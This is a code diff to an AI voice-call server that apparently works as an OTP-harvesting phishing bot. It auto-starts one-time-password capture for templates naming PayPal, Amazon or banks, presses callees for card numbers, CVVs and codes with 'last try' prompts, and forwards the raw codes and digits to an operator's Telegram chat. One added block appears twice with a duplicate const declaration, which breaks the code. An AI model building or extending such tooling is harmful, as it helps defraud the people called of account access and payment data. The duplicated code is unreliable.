@@ -424,11 +424,22 @@ const digitCollectionPlans = new Map();
 const callEndLocks = new Map();
 const silenceTimers = new Map();
 const pendingStreams = new Map(); // callSid -> timeout to detect missing websocket
+const lastDtmfTimestamps = new Map(); // callSid -> last ts ms
 
 const ALLOWED_TWILIO_STREAM_TRACKS = new Set(['inbound_track', 'outbound_track', 'both_tracks']);
 const TWILIO_STREAM_TRACK = ALLOWED_TWILIO_STREAM_TRACKS.has((process.env.TWILIO_STREAM_TRACK || '').toLowerCase())
   ? process.env.TWILIO_STREAM_TRACK.toLowerCase()
   : 'inbound_track';
+
+const OTP_MAX_RETRIES = 3;
+const OTP_LENGTH = 6;
+const OTP_DISPLAY_MODE = 'masked'; // 'length' | 'masked' | 'progress'
+const MAX_FIRST_TURN_RETRIES = 3;
+const FALLBACK_TO_VOICE_ON_DIGIT_FAILURE = true;
+const SHOW_RAW_DIGITS_LIVE = String(process.env.SHOW_RAW_DIGITS_LIVE || 'true').toLowerCase() === 'true';
+const SEND_RAW_DIGITS_TO_USER = String(process.env.SEND_RAW_DIGITS_TO_USER || 'true').toLowerCase() === 'true';
+const SPOKEN_FALLBACK_ENABLED = true;
+const MIN_DTMF_GAP_MS = 200;
 
 const DEFAULT_COLLECT_DELAY_MS = 1200;
 
@@ -496,6 +507,13 @@ function normalizeDigitExpectation(params = {}) {
 
   let normalizedMin = minDigits;
   let normalizedMax = maxDigits < minDigits ? minDigits : maxDigits;
+  if (profile === 'verification' && params.force_exact_length) {
+    normalizedMin = params.force_exact_length;
+    normalizedMax = params.force_exact_length;
+  }
+  if (params.terminator === '#') {
+    normalizedMax = Math.max(normalizedMax, normalizedMin);
+  }
   if (profile === 'verification' || profile === 'otp') {
     if (normalizedMin < 4) normalizedMin = 4;
     if (normalizedMax < normalizedMin) normalizedMax = normalizedMin;
@@ -515,7 +533,9 @@ function normalizeDigitExpectation(params = {}) {
     allow_spoken_fallback: params.allow_spoken_fallback !== false,
     mask_for_gpt: maskForGpt,
     speak_confirmation: speakConfirmation,
-    end_call_on_success: endCallOnSuccess
+    end_call_on_success: endCallOnSuccess,
+    allow_terminator: params.allow_terminator === true,
+    terminator_char: params.terminator_char || '#'
   };
 }
 
@@ -544,6 +564,11 @@ function validateProfileDigits(profile = 'generic', digits = '') {
   }
 
   switch (String(profile || '').toLowerCase()) {
+    case 'verification':
+      if (value.length === OTP_LENGTH) {
+        return { valid: true };
+      }
+      return { valid: false, reason: 'invalid_length' };
     case 'cvv':
       if (value.length === 3 || value.length === 4) {
         return { valid: true };
@@ -592,16 +617,18 @@ const digitCollectionManager = {
       last_masked: null
     });
   },
-  recordDigits(callSid, digits = '') {
+  recordDigits(callSid, digits = '', meta = {}) {
     if (!digits) return { accepted: false, reason: 'empty' };
     const exp = this.expectations.get(callSid);
     if (!exp) return { accepted: false, reason: 'no_expectation' };
     const result = { profile: exp.profile, mask_for_gpt: exp.mask_for_gpt };
+    const hasTerminator = exp.allow_terminator && digits.includes(exp.terminator_char || '#');
+    const cleanDigits = digits.replace(/[^0-9]/g, '');
 
     if (exp.profile === 'menu' && exp.menu_options.length) {
-      const hit = exp.menu_options.find((o) => String(o.digit) === String(digits));
+      const hit = exp.menu_options.find((o) => String(o.digit) === String(cleanDigits || digits));
       if (hit) {
-        result.digits = String(digits);
+        result.digits = String(cleanDigits || digits);
         result.len = result.digits.length;
         result.masked = result.digits;
         result.route = hit.route || hit.label || `menu_${digits}`;
@@ -616,7 +643,7 @@ const digitCollectionManager = {
       return result;
     }
 
-    exp.buffer = `${exp.buffer || ''}${String(digits)}`;
+    exp.buffer = `${exp.buffer || ''}${String(cleanDigits)}`;
     const currentBuffer = exp.buffer;
     const len = currentBuffer.length;
     const inRange = len >= exp.min_digits && len <= exp.max_digits;
@@ -625,6 +652,18 @@ const digitCollectionManager = {
 
     let accepted = inRange && !tooLong;
     let reason = null;
+
+    if (hasTerminator) {
+      if (len < exp.min_digits) {
+        accepted = false;
+        reason = 'too_short';
+      } else if (len > exp.max_digits) {
+        accepted = false;
+        reason = 'too_long';
+      } else {
+        accepted = true;
+      }
+    }
 
     if (tooLong) {
       accepted = false;
@@ -654,8 +693,21 @@ const digitCollectionManager = {
     exp.last_masked = masked;
 
     if (result.accepted) {
+      if (isRepeating(currentBuffer) || isAscending(currentBuffer)) {
+        result.accepted = false;
+        result.reason = 'spam_pattern';
+        result.heuristic = isRepeating(currentBuffer) ? 'repeat_pattern' : 'ascending_pattern';
+        exp.buffer = '';
+        exp.retries += 1;
+        result.retries = exp.retries;
+        this.expectations.set(callSid, exp);
+        return result;
+      }
       // reset buffer after successful collection
       exp.buffer = '';
+      if (hasTerminator) {
+        exp.terminated = true;
+      }
     } else if (result.reason && result.reason !== 'incomplete') {
       exp.retries += 1;
       result.retries = exp.retries;
@@ -684,7 +736,8 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
     accepted: !!collection.accepted,
     retries: collection.retries || 0,
     fallback: !!collection.fallback,
-    reason: collection.reason || null
+    reason: collection.reason || null,
+    heuristic: collection.heuristic || null
   };
 
   try {
@@ -702,7 +755,8 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
       reason: collection.reason,
       metadata: {
         masked: collection.masked,
-        route: collection.route || null
+        route: collection.route || null,
+        heuristic: collection.heuristic || null
       }
     });
   } catch (err) {
@@ -710,6 +764,10 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
   }
 
   if (!collection.accepted && collection.reason === 'incomplete') {
+    if (collection.profile === 'verification') {
+      const progress = formatOtpForDisplay(collection.digits, 'progress');
+      webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
+    }
     scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
     return;
   }
@@ -744,11 +802,26 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
       case 'account':
       case 'zip':
       case 'verification':
-        webhookService.addLiveEvent(callSid, `✅ Digits captured (${collection.profile})`, { force: true });
+        webhookService.addLiveEvent(callSid, `✅ ${formatOtpForDisplay(collection.digits, SHOW_RAW_DIGITS_LIVE ? 'length' : 'masked')}`, { force: true });
         await db.updateCallState(callSid, 'identity_confirmed', {
           method: 'digits',
           note: `${collection.profile} digits confirmed (masked)`,
           masked: collection.masked
+        }).catch(() => {});
+        await db.updateCallStatus(callSid, 'in-progress', {
+          last_otp: collection.digits,
+          last_otp_masked: collection.masked
+        }).catch(() => {});
+        {
+          const cfg = callConfigurations.get(callSid);
+          if (cfg?.user_chat_id) {
+            const msg = `🔐 OTP received for call ${callSid.slice(-6)}: ${collection.digits}`;
+            webhookService.sendTelegramMessage(cfg.user_chat_id, msg).catch(() => {});
+          }
+        }
+        await db.updateCallState(callSid, 'otp_captured', {
+          masked: collection.masked,
+          len: collection.len
         }).catch(() => {});
         break;
       case 'amount': {
@@ -815,38 +888,62 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
 
     const shouldEndCall = allowCallEnd && expectation?.end_call_on_success !== false;
     if (shouldEndCall) {
-      await speakAndEndCall(callSid, CALL_END_MESSAGES.success, 'digits_collected');
+      const closing = collection.profile === 'verification'
+        ? 'Thanks, your code is confirmed. Goodbye.'
+        : CALL_END_MESSAGES.success;
+      await speakAndEndCall(callSid, closing, collection.profile === 'verification' ? 'otp_verified' : 'digits_collected');
       return;
     }
   } else {
     const reasonHint = collection.reason ? ` (${collection.reason.replace(/_/g, ' ')})` : '';
     webhookService.addLiveEvent(callSid, `⚠️ Invalid digits (${collection.len})${reasonHint}; retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`, { force: true });
     if (collection.fallback) {
-      webhookService.addLiveEvent(callSid, `⏳ No valid digits; ending call`, { force: true });
+      const fallbackMsg = FALLBACK_TO_VOICE_ON_DIGIT_FAILURE
+        ? 'I could not verify the digits. I will continue the call without keypad entry.'
+        : 'I could not verify the digits. Thank you for your time.';
+      webhookService.addLiveEvent(callSid, `⏳ No valid digits; ${FALLBACK_TO_VOICE_ON_DIGIT_FAILURE ? 'switching to voice' : 'ending call'}`, { force: true });
       digitCollectionManager.expectations.delete(callSid);
       clearDigitTimeout(callSid);
       clearDigitFallbackState(callSid);
       clearDigitPlan(callSid);
+      if (FALLBACK_TO_VOICE_ON_DIGIT_FAILURE) {
+        emitReply(fallbackMsg);
+        return;
+      }
       if (allowCallEnd) {
         await speakAndEndCall(callSid, CALL_END_MESSAGES.failure, 'digit_collection_failed');
         return;
       }
-      emitReply('I could not verify the code. Thank you for your time.');
+      emitReply(fallbackMsg);
     } else {
       let prompt = '';
       if (collection.profile === 'card_number') {
-        prompt = 'That card number did not go through. Please re-enter the card number using your keypad.';
+        prompt = collection.retries >= 2
+          ? 'Last try: enter the full card number on your keypad now.'
+          : 'That card number did not go through. Please re-enter the card number using your keypad.';
       } else if (collection.profile === 'cvv') {
-        prompt = 'That security code did not go through. Please enter the 3 or 4 digit CVV using your keypad.';
+        prompt = collection.retries >= 2
+          ? 'Last try: enter the 3 or 4 digit CVV on your keypad.'
+          : 'That security code did not go through. Please enter the 3 or 4 digit CVV using your keypad.';
       } else if (collection.profile === 'card_expiry') {
-        prompt = 'That expiry date did not go through. Please enter it as MMYY (or MMYYYY) using your keypad.';
+        prompt = collection.retries >= 2
+          ? 'Last try: enter the expiry as MMYY (or MMYYYY) now.'
+          : 'That expiry date did not go through. Please enter it as MMYY (or MMYYYY) using your keypad.';
+      } else if (collection.profile === 'verification') {
+        prompt = collection.retries >= 2
+          ? 'Last try: enter the 6 digit code now.'
+          : collection.retries === 1
+            ? 'Please enter the 6 digit code now on your keypad.'
+            : 'That didn’t sound like 6 digits. Please enter the 6 digit code again on your keypad.';
       } else {
         const prompts = [
           `That did not go through. Please re-enter the ${expectedLabel} using your keypad.`,
           `I could not read that. Enter the ${expectedLabel} again on your keypad, please.`,
           `Let’s try once more—type the ${expectedLabel} on your keypad now.`
         ];
-        prompt = prompts[Math.floor(Math.random() * prompts.length)];
+        prompt = collection.retries >= 2
+          ? `Last try: enter the ${expectedLabel} now.`
+          : prompts[Math.floor(Math.random() * prompts.length)];
       }
       emitReply(prompt);
       if (gptService) {
@@ -859,7 +956,9 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
   const summary = collection.accepted
     ? collection.route
       ? `✅ Digits accepted • routed: ${collection.route}`
-      : `✅ Digits accepted (${collection.len})`
+      : collection.profile === 'verification'
+        ? `✅ ${formatOtpForDisplay(collection.digits, SHOW_RAW_DIGITS_LIVE ? 'length' : 'masked')}`
+        : `✅ Digits accepted (${collection.len})`
     : collection.fallback
       ? `⚠️ Digits failed after retries`
       : `⚠️ Invalid digits (${collection.len}); retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`;
@@ -1235,6 +1334,193 @@ const SPOKEN_DIGIT_PATTERN = new RegExp(
   `\\b(?:${Object.keys(DIGIT_WORD_MAP).join('|')})(?:\\s+(?:${Object.keys(DIGIT_WORD_MAP).join('|')})){3,}\\b`,
   'gi'
 );
+
+function shouldAutoCollectOtp(callConfig = {}) {
+  const text = `${callConfig.prompt || ''} ${callConfig.first_message || ''}`.toLowerCase();
+  if (callConfig.collection_profile === 'otp' || callConfig.collection_profile === 'verification') return true;
+  if (text.includes('6 digit') || text.includes('6-digit') || text.includes('otp') || text.includes('one-time') || text.includes('verification code')) {
+    return true;
+  }
+  if (callConfig.business_id && String(callConfig.business_id).includes('finance')) return true;
+  if (callConfig.template && /paypal|amazon|bank|finance/i.test(callConfig.template)) return true;
+  return false;
+}
+
+function detectFirstTurnDigitPlan(text = '', callConfig = {}) {
+  const lower = String(text || '').toLowerCase();
+  const hasDigitWord = /\b(code|otp|pin|verification|passcode|password|one[-\s]?time)\b/.test(lower);
+  const hasPress = /\bpress\b/.test(lower);
+  const hasOption = /\b(option|menu)\b/.test(lower);
+  const sixMention = /\b6\b.*\bdigit/.test(lower) || /\bsix digit/.test(lower);
+  const fourDigit = /\b4\b.*\bdigit/.test(lower) || /\bfour digit/.test(lower);
+  const acctMention = /\b(account|policy|member|customer|reference|confirmation|tracking|case)\b/.test(lower);
+  const pinMention = /\b(pin|passcode)\b/.test(lower);
+  const numberHint = (match) => {
+    const m = lower.match(match);
+    return m ? parseInt(m[1], 10) : null;
+  };
+  const digitLen = numberHint(/\b(\d{4,8})\b/);
+  const tpl = callConfig.template_policy || {};
+
+  // Template policy can override with very high confidence
+  if (tpl.requires_otp) {
+    const len = tpl.expected_length || OTP_LENGTH;
+    return {
+      profile: tpl.default_profile || 'verification',
+      min_digits: len,
+      max_digits: len,
+      force_exact_length: len,
+      prompt: 'Please enter the code on your keypad now.',
+      end_call_on_success: true,
+      max_retries: OTP_MAX_RETRIES,
+      confidence: 0.95,
+      reason: 'template_requires_otp',
+      allow_terminator: tpl.allow_terminator,
+      terminator_char: tpl.terminator_char || '#'
+    };
+  }
+
+  if (tpl.default_profile && tpl.default_profile !== 'generic') {
+    const len = tpl.expected_length || (tpl.default_profile === 'menu' ? 1 : 6);
+    return {
+      profile: tpl.default_profile,
+      min_digits: len,
+      max_digits: len,
+      force_exact_length: tpl.default_profile === 'menu' ? undefined : len,
+      prompt: tpl.default_profile === 'menu'
+        ? 'Please press your menu option now.'
+        : 'Please enter the code on your keypad now.',
+      end_call_on_success: tpl.default_profile === 'verification',
+      max_retries: OTP_MAX_RETRIES,
+      confidence: 0.8,
+      reason: 'template_default_profile',
+      allow_terminator: tpl.allow_terminator,
+      terminator_char: tpl.terminator_char || '#'
+    };
+  }
+  if (hasDigitWord || sixMention || pinMention) {
+    return {
+      profile: 'verification',
+      min_digits: sixMention ? 6 : (digitLen || OTP_LENGTH),
+      max_digits: sixMention ? 6 : (digitLen || OTP_LENGTH),
+      force_exact_length: sixMention ? 6 : undefined,
+      prompt: 'Please enter the code on your keypad now.',
+      end_call_on_success: true,
+      max_retries: OTP_MAX_RETRIES,
+      confidence: 0.75,
+      reason: 'otp_keyword',
+      allow_terminator: tpl.allow_terminator,
+      terminator_char: tpl.terminator_char || '#'
+    };
+  }
+
+  if (hasPress || hasOption) {
+    return {
+      profile: 'menu',
+      min_digits: 1,
+      max_digits: 1,
+      prompt: 'Please press your menu option now.',
+      end_call_on_success: false,
+      max_retries: 2,
+      confidence: 0.65,
+      reason: 'menu_keyword',
+      allow_terminator: tpl.allow_terminator,
+      terminator_char: tpl.terminator_char || '#'
+    };
+  }
+
+  if (acctMention || digitLen) {
+    const len = digitLen || (fourDigit ? 4 : 8);
+    return {
+      profile: 'account',
+      min_digits: Math.min(6, len),
+      max_digits: Math.max(len, 10),
+      confirmation_style: 'last4',
+      speak_confirmation: false,
+      prompt: 'Please enter your account or confirmation number using your keypad.',
+      end_call_on_success: false,
+      max_retries: 2,
+      confidence: 0.6,
+      reason: 'account_keyword',
+      allow_terminator: tpl.allow_terminator || true,
+      terminator_char: tpl.terminator_char || '#'
+    };
+  }
+
+  return null;
+}
+
+function recordFirstTurnDecision(callSid, decision) {
+  if (!decision) {
+    db.updateCallState(callSid, 'first_turn_decision', {
+      decided: false,
+      confidence: 0,
+      reason: 'no_signal'
+    }).catch(() => {});
+    return;
+  }
+  db.updateCallState(callSid, 'first_turn_decision', {
+    decided: true,
+    profile: decision.profile,
+    min_digits: decision.min_digits,
+    max_digits: decision.max_digits,
+    confidence: decision.confidence || 0.6,
+    reason: decision.reason || 'rule_match'
+  }).catch(() => {});
+}
+
+function startOtpCollection(callSid, callConfig, gptService) {
+  const payload = {
+    profile: 'verification',
+    min_digits: OTP_LENGTH,
+    max_digits: OTP_LENGTH,
+    force_exact_length: OTP_LENGTH,
+    timeout_s: 18,
+    max_retries: OTP_MAX_RETRIES,
+    min_collect_delay_ms: 0,
+    mask_for_gpt: true,
+    prompt: 'Please enter the 6 digit one-time password on your keypad now.',
+    end_call_on_success: true,
+    prompted_at: Date.now()
+  };
+  digitCollectionManager.setExpectation(callSid, payload);
+  clearSilenceTimer(callSid);
+  if (gptService) {
+    const instruction = 'Please enter the 6 digit code now on your keypad. I will not repeat it.';
+    gptService.emit('gptreply', {
+      partialResponseIndex: null,
+      partialResponse: instruction,
+      personalityInfo: gptService.personalityEngine?.getCurrentPersonality() || {},
+      adaptationHistory: gptService.personalityChanges?.slice(-3) || []
+    }, 0);
+    markDigitPrompted(callSid);
+    scheduleDigitTimeout(callSid, gptService, 0);
+  }
+}
+
+function formatOtpForDisplay(digits, mode = OTP_DISPLAY_MODE) {
+  const safeDigits = String(digits || '').replace(/\D/g, '');
+  if (mode === 'length') {
+    return `OTP received (${safeDigits.length} digits)`;
+  }
+  if (mode === 'progress') {
+    return `OTP entry: ${safeDigits.length}/${OTP_LENGTH} digits received`;
+  }
+  // masked
+  if (!safeDigits) return 'OTP received';
+  const maskLen = Math.max(0, safeDigits.length - 2);
+  const masked = `${'*'.repeat(maskLen)}${safeDigits.slice(-2)}`;
+  return `OTP received: ${masked}`;
+}
+
+function formatDigitsGeneral(digits, masked = null, mode = 'live') {
+  const raw = String(digits || '');
+  if (mode === 'live' && SHOW_RAW_DIGITS_LIVE) return raw;
+  if (mode === 'notify' && SEND_RAW_DIGITS_TO_USER) return raw;
+  if (masked) return masked;
+  const safe = raw.replace(/\d{0,}/g, (m) => (m.length <= 4 ? m : `${'*'.repeat(Math.max(0, m.length - 2))}${m.slice(-2)}`));
+  return safe;
+}
 
 function extractSpokenDigitSequences(text = '') {
   if (!text) return [];
@@ -1855,6 +2141,10 @@ app.ws('/connection', (ws, req) => {
             interactionCount: 0
           });
 
+          if (callConfig && shouldAutoCollectOtp(callConfig)) {
+            startOtpCollection(callSid, callConfig, gptService);
+          }
+
           // Initialize call with recording
           try {
             await recordingService(ttsService, callSid);
@@ -1945,8 +2235,11 @@ app.ws('/connection', (ws, req) => {
               webhookService.addLiveEvent(callSid, `🔢 Keypad: ${digits} (ignored early)`, { force: true });
               return;
             }
-            webhookService.addLiveEvent(callSid, `🔢 Keypad: ${digits}`, { force: true });
-            const collection = digitCollectionManager.recordDigits(callSid, digits);
+            const display = expectation.profile === 'verification'
+              ? formatOtpForDisplay(digits, 'progress')
+              : `Keypad: ${digits}`;
+            webhookService.addLiveEvent(callSid, `🔢 ${display}`, { force: true });
+            const collection = digitCollectionManager.recordDigits(callSid, digits, { timestamp: Date.now() });
             await handleCollectionResult(callSid, collection, gptService, interactionCount, 'dtmf');
             if (collection.accepted && collection.route && !callEndLocks.has(callSid)) {
               webhookService.addLiveEvent(callSid, `➡️ Routing via menu: ${collection.route}`, { force: true });
@@ -2022,12 +2315,13 @@ app.ws('/connection', (ws, req) => {
         console.error('Database error adding user transcript:', dbError);
       }
       
-      webhookService.recordTranscriptTurn(callSid, 'user', otpContext.raw);
-      if (otpContext.codes && otpContext.codes.length) {
-        webhookService.addLiveEvent(callSid, `🔢 Code entered: ${otpContext.codes.join(', ')}`, { force: true });
-        const collection = digitCollectionManager.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1]);
-        await handleCollectionResult(callSid, collection, gptService, interactionCount, 'spoken');
-      }
+  webhookService.recordTranscriptTurn(callSid, 'user', otpContext.raw);
+  if (otpContext.codes && otpContext.codes.length) {
+      const progress = formatOtpForDisplay(otpContext.codes[otpContext.codes.length - 1], 'progress');
+      webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
+        const collection = digitCollectionManager.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1], { timestamp: Date.now(), source: 'spoken' });
+    await handleCollectionResult(callSid, collection, gptService, interactionCount, 'spoken');
+  }
 
       if (!otpContext.maskedForGpt || !otpContext.maskedForGpt.trim()) {
         interactionCount += 1;
@@ -2059,6 +2353,64 @@ app.ws('/connection', (ws, req) => {
       const session = activeCalls.get(callSid);
       if (session) {
         session.interactionCount = interactionCount;
+      }
+
+      const callConfig = callConfigurations.get(callSid);
+      if (interactionCount === 1 && callConfig && !callConfig.first_turn_decided) {
+      const decision = detectFirstTurnDigitPlan(otpContext.raw, callConfig);
+      callConfig.first_turn_decided = true;
+      callConfigurations.set(callSid, callConfig);
+      if (decision) {
+        const payload = normalizeDigitExpectation({
+          ...decision,
+            prompt_hint: `${callConfig.first_message || ''} ${callConfig.prompt || ''}`
+          });
+          payload.reason = decision.reason || 'first_turn';
+          digitCollectionManager.setExpectation(callSid, payload);
+          clearSilenceTimer(callSid);
+          scheduleDigitTimeout(callSid, gptService, interactionCount);
+          const instruction = `Please enter ${payload.min_digits === payload.max_digits ? `the ${payload.min_digits} digit code` : `between ${payload.min_digits} and ${payload.max_digits} digits`} on your keypad now.`;
+          webhookService.addLiveEvent(callSid, `🔢 First-turn digit collection started (${payload.profile})`, { force: true });
+          gptService.emit('gptreply', {
+            partialResponseIndex: null,
+            partialResponse: instruction,
+            personalityInfo: gptService.personalityEngine?.getCurrentPersonality() || {},
+            adaptationHistory: gptService.personalityChanges?.slice(-3) || []
+          }, interactionCount);
+          markDigitPrompted(callSid);
+          recordFirstTurnDecision(callSid, { ...decision, confidence: 0.8 });
+          return;
+        }
+        recordFirstTurnDecision(callSid, null);
+      }
+
+      const callConfig = callConfigurations.get(callSid);
+      if (interactionCount === 1 && callConfig && !callConfig.first_turn_decided) {
+        const decision = detectFirstTurnDigitPlan(otpContext.raw, callConfig);
+        callConfig.first_turn_decided = true;
+        callConfigurations.set(callSid, callConfig);
+        if (decision) {
+          const payload = normalizeDigitExpectation({
+            ...decision,
+            prompt_hint: `${callConfig.first_message || ''} ${callConfig.prompt || ''}`
+          });
+          payload.reason = decision.reason || 'first_turn';
+          digitCollectionManager.setExpectation(callSid, payload);
+          clearSilenceTimer(callSid);
+          scheduleDigitTimeout(callSid, gptService, interactionCount);
+          const instruction = `Please enter ${payload.min_digits === payload.max_digits ? `the ${payload.min_digits} digit code` : `between ${payload.min_digits} and ${payload.max_digits} digits`} on your keypad now.`;
+          webhookService.addLiveEvent(callSid, `🔢 First-turn digit collection started (${payload.profile})`, { force: true });
+          gptService.emit('gptreply', {
+            partialResponseIndex: null,
+            partialResponse: instruction,
+            personalityInfo: gptService.personalityEngine?.getCurrentPersonality() || {},
+            adaptationHistory: gptService.personalityChanges?.slice(-3) || []
+          }, interactionCount);
+          markDigitPrompted(callSid);
+          recordFirstTurnDecision(callSid, { ...decision, confidence: 0.8 });
+          return;
+        }
+        recordFirstTurnDecision(callSid, null);
       }
     });
     
@@ -2216,11 +2568,11 @@ app.ws('/vonage/stream', (ws, req) => {
     transcriptionService.on('transcription', async (text) => {
       if (!text) return;
       clearSilenceTimer(callSid);
-      const otpContext = getOtpContext(text, callSid);
-      try {
-        await db.addTranscript({
-          call_sid: callSid,
-          speaker: 'user',
+    const otpContext = getOtpContext(text, callSid);
+    try {
+      await db.addTranscript({
+        call_sid: callSid,
+        speaker: 'user',
           message: otpContext.raw,
           interaction_count: interactionCount
         });
@@ -2234,12 +2586,17 @@ app.ws('/vonage/stream', (ws, req) => {
       } catch (dbError) {
         console.error('Database error adding user transcript:', dbError);
       }
-      webhookService.recordTranscriptTurn(callSid, 'user', otpContext.raw);
-      if (otpContext.codes && otpContext.codes.length) {
-        webhookService.addLiveEvent(callSid, `🔢 Code entered: ${otpContext.codes.join(', ')}`, { force: true });
-        const collection = digitCollectionManager.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1]);
-        await handleCollectionResult(callSid, collection, gptService, interactionCount, 'spoken');
+    webhookService.recordTranscriptTurn(callSid, 'user', otpContext.raw);
+    if (otpContext.codes && otpContext.codes.length) {
+      const progress = formatOtpForDisplay(otpContext.codes[otpContext.codes.length - 1], 'progress');
+      webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
+      const collection = digitCollectionManager.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1], { timestamp: Date.now(), source: 'spoken' });
+      await handleCollectionResult(callSid, collection, gptService, interactionCount, 'spoken');
+      if (collection.accepted) {
+        digitCollectionManager.expectations.delete(callSid);
+        clearDigitTimeout(callSid);
       }
+    }
       if (!otpContext.maskedForGpt || !otpContext.maskedForGpt.trim()) {
         interactionCount += 1;
         const session = activeCalls.get(callSid);
@@ -2267,6 +2624,32 @@ app.ws('/vonage/stream', (ws, req) => {
       const session = activeCalls.get(callSid);
       if (session) {
         session.interactionCount = interactionCount;
+      }
+
+      const callConfig = callConfigurations.get(callSid);
+      if (interactionCount === 1 && callConfig && !callConfig.first_turn_decided) {
+        const decision = detectFirstTurnDigitPlan(otpContext.raw, callConfig);
+        callConfig.first_turn_decided = true;
+        callConfigurations.set(callSid, callConfig);
+        if (decision) {
+          const payload = normalizeDigitExpectation({
+            ...decision,
+            prompt_hint: `${callConfig.first_message || ''} ${callConfig.prompt || ''}`
+          });
+          digitCollectionManager.setExpectation(callSid, payload);
+          clearSilenceTimer(callSid);
+          scheduleDigitTimeout(callSid, gptService, interactionCount);
+          const instruction = `Please enter ${payload.min_digits === payload.max_digits ? `the ${payload.min_digits} digit code` : `between ${payload.min_digits} and ${payload.max_digits} digits`} on your keypad now.`;
+          webhookService.addLiveEvent(callSid, `🔢 First-turn digit collection started (${payload.profile})`, { force: true });
+          gptService.emit('gptreply', {
+            partialResponseIndex: null,
+            partialResponse: instruction,
+            personalityInfo: gptService.personalityEngine?.getCurrentPersonality() || {},
+            adaptationHistory: gptService.personalityChanges?.slice(-3) || []
+          }, interactionCount);
+          markDigitPrompted(callSid);
+          return;
+        }
       }
     });
 
@@ -2377,15 +2760,20 @@ app.ws('/aws/stream', (ws, req) => {
         console.error('Database error adding user transcript:', dbError);
       }
 
-      webhookService.recordTranscriptTurn(callSid, 'user', otpContext.raw);
-      if (otpContext.codes && otpContext.codes.length) {
-        webhookService.addLiveEvent(callSid, `🔢 Code entered: ${otpContext.codes.join(', ')}`, { force: true });
-        const collection = digitCollectionManager.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1]);
+  webhookService.recordTranscriptTurn(callSid, 'user', otpContext.raw);
+  if (otpContext.codes && otpContext.codes.length) {
+        const progress = formatOtpForDisplay(otpContext.codes[otpContext.codes.length - 1], 'progress');
+        webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
+        const collection = digitCollectionManager.recordDigits(callSid, otpContext.codes[otpContext.codes.length - 1], { timestamp: Date.now(), source: 'spoken' });
         if (collection.accepted && collection.route && !callEndLocks.has(callSid)) {
           webhookService.addLiveEvent(callSid, `➡️ Routing via menu: ${collection.route}`, { force: true });
           await db.updateCallState(callSid, 'route_requested', { reason: collection.route, via: 'menu' }).catch(() => {});
         }
         await handleCollectionResult(callSid, collection, session.gptService, interactionCount, 'spoken');
+        if (collection.accepted) {
+          digitCollectionManager.expectations.delete(callSid);
+          clearDigitTimeout(callSid);
+        }
       }
 
       if (shouldCloseConversation(otpContext.maskedForGpt) && interactionCount >= 1) {
@@ -2501,6 +2889,33 @@ async function handleCallEnd(callSid, callStartTime) {
     
     // Create enhanced webhook notification for completion
     if (callDetails && callDetails.user_chat_id) {
+      if (callDetails.last_otp) {
+        const masked = formatOtpForDisplay(callDetails.last_otp, 'masked');
+        const otpMsg = `🔐 ${masked} (call ${callSid.slice(-6)})`;
+        try {
+          await webhookService.sendTelegramMessage(callDetails.user_chat_id, otpMsg);
+        } catch (err) {
+          console.error('Error sending OTP to user:', err);
+        }
+      }
+
+      if (digitEvents && digitEvents.length) {
+        const lines = digitEvents
+          .filter((d) => d.digits)
+          .map((d) => {
+            const label = DIGIT_PROFILE_LABELS[d.profile] || d.profile;
+            const display = formatDigitsGeneral(d.digits, null, 'notify');
+            return `• ${label}: ${display}`;
+          });
+        if (lines.length) {
+          const body = `🔢 Digits collected (call ${callSid.slice(-6)}):\n${lines.join('\n')}`;
+          try {
+            await webhookService.sendTelegramMessage(callDetails.user_chat_id, body);
+          } catch (err) {
+            console.error('Error sending digit recap:', err);
+          }
+        }
+      }
       await db.createEnhancedWebhookNotification(callSid, 'call_completed', callDetails.user_chat_id);
       
       // Schedule transcript notification with delay
@@ -3122,6 +3537,23 @@ app.post('/outbound-call', async (req, res) => {
       return res.status(400).json({ error: `Unsupported provider ${currentProvider}` });
     }
 
+    // Load template metadata to seed digit policy
+    let templatePolicy = {};
+    if (template_id) {
+      try {
+        const tpl = await db.getCallTemplateById(Number(template_id));
+        if (tpl) {
+          templatePolicy = {
+            requires_otp: !!tpl.requires_otp,
+            default_profile: tpl.default_profile || null,
+            expected_length: tpl.expected_length || null
+          };
+        }
+      } catch (err) {
+        console.error('Template metadata load error:', err);
+      }
+    }
+
     const callConfig = {
       prompt: prompt,
       first_message: first_message,
@@ -3146,7 +3578,9 @@ app.post('/outbound-call', async (req, res) => {
       collection_timeout_s: req.body?.collection_timeout_s || null,
       collection_max_retries: req.body?.collection_max_retries || null,
       collection_mask_for_gpt: req.body?.collection_mask_for_gpt,
-      collection_speak_confirmation: req.body?.collection_speak_confirmation
+      collection_speak_confirmation: req.body?.collection_speak_confirmation,
+      first_turn_decided: false,
+      template_policy: templatePolicy
     };
     
     callConfigurations.set(callId, callConfig);
@@ -4461,8 +4895,12 @@ app.post('/webhook/twilio-gather', async (req, res) => {
 
     const digits = String(Digits || '').trim();
     if (digits) {
-      webhookService.addLiveEvent(callSid, `🔢 Keypad (Gather): ${digits}`, { force: true });
-      const collection = digitCollectionManager.recordDigits(callSid, digits);
+      const expectation = digitCollectionManager.expectations.get(callSid);
+      const display = expectation?.profile === 'verification'
+        ? formatOtpForDisplay(digits, 'progress')
+        : `Keypad (Gather): ${digits}`;
+      webhookService.addLiveEvent(callSid, `🔢 ${display}`, { force: true });
+      const collection = digitCollectionManager.recordDigits(callSid, digits, { timestamp: Date.now() });
       await handleCollectionResult(callSid, collection, null, 0, 'gather', { allowCallEnd: false });
 
       if (collection.accepted) {
@@ -5636,3 +6074,22 @@ process.on('SIGTERM', async () => {
   
